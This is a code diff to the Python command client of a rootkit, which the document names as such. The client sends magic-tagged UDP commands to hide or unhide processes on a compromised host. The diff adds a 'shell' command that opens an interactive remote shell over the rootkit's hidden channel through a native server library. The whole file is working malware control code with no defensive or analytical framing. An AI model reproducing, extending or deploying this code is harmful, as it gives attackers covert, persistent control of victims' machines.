@@ -5,13 +5,18 @@ from argparse import ArgumentParser
 from enum import Enum
 from threading import Condition, Thread
 from socket import socket, IPPROTO_UDP, SOCK_DGRAM, AF_INET, SocketType, timeout as timeout_error
-
+from ctypes import cdll, create_string_buffer
 from typing import Dict, Optional
+from pathlib import Path
 
 JOB_ID_SIZE = 2
+MAX_JOB_ID = 2 ** (JOB_ID_SIZE * 8) - 1
 REQUEST_PORT = 1111
 MAGIC = b'mrk'
 SOCK_TIMEOUT = 0.1
+
+SERVER_SO = Path(__file__).absolute().parent.parent / 'usermode' / 'server.so'
+SERVER = cdll.LoadLibrary(SERVER_SO)
 
 
 class CommandType(Enum):
@@ -20,6 +25,12 @@ class CommandType(Enum):
     HIDE_PROCESS = b'hproc'
     UNHIDE_PROCESS = b'uproc'
     EXIT = b'fexit'
+    SHELL = b'shell'
+
+def _open_shell(socket: SocketType, prefix: bytes):
+    inprefix_buff = create_string_buffer(prefix)
+    outprefix_buff = create_string_buffer(MAGIC + prefix)
+    SERVER.start_server(socket.fileno(), inprefix_buff, outprefix_buff)
 
 
 class Client:
@@ -32,29 +43,49 @@ class Client:
         self._condition: Condition = Condition()
         self._thread = Thread(target=self._listen_for_responses)
         self._should_stop = False
-        self._remote = remote
+        self.bind(remote)
 
     def bind(self, remote):
         self._remote = remote
+        self._sock.connect((self._remote, REQUEST_PORT))
 
     def start(self):
         self._thread.start()
 
-    def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
+    def _get_job_id(self):
+        return random.randint(0, MAX_JOB_ID)
+
+    def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None, _job_id: Optional[int] = None):
         assert self._thread.is_alive(), 'client must be started before sending'
         # TODO: Switch to randbytes in python 3.9
-        job_id = random.randint(0, 2 ** (JOB_ID_SIZE * 8) - 1)
+        job_id = _job_id or self._get_job_id()
+        assert 0 < job_id < MAX_JOB_ID and isinstance(job_id, int), f"invalid job id, must be a {JOB_ID_SIZE} bit unsigned integer"
         # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
         msg = MAGIC + struct.pack('H', job_id) + command.value + argument.encode('ascii')
         self._sock.sendto(msg, (remote, REQUEST_PORT))
         return self._await_response(job_id, timeout)
 
-    def send(self, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
-        return self.sendto(self._remote, command, argument, timeout=timeout)
+    def send(self, command: CommandType, argument: str = '', *, timeout: Optional[float] = None, _job_id: Optional[int] = None):
+        return self.sendto(self._remote, command, argument, timeout=timeout, _job_id=_job_id)
 
-    def close(self):
+    def open_shell(self, *, timeout: Optional[float] = None):
+        job_id = self._get_job_id()
+        # Start the hidden communication stream.
+        res = self.send(CommandType.SHELL, timeout=timeout, _job_id=job_id)
+        if res is None:
+            print('timed out')
+            return res
+        # Stop looking for responses so we don't interfere.
+        self._stop_thread()
+        # Open shell on hidden connection with the same job_id.
+        _open_shell(self._sock, struct.pack('H', job_id))
+
+    def _stop_thread(self):
         self._should_stop = True
         self._thread.join()
+
+    def close(self):
+        self._stop_thread()
         self._sock.close()
 
     def _submit_response(self, job_id: int, status: int) -> None:
@@ -89,6 +120,10 @@ def main():
     ns = parser.parse_args(sys.argv[1:])
     s = Client(ns.remote_ip)
     s.start()
+    if (ns.command_type == CommandType.SHELL):
+        s.open_shell(timeout=1)
+        s.close()
+        return 0
     status = s.send(ns.command_type, ns.argument, timeout=1)
     s.close()
     if status is None:
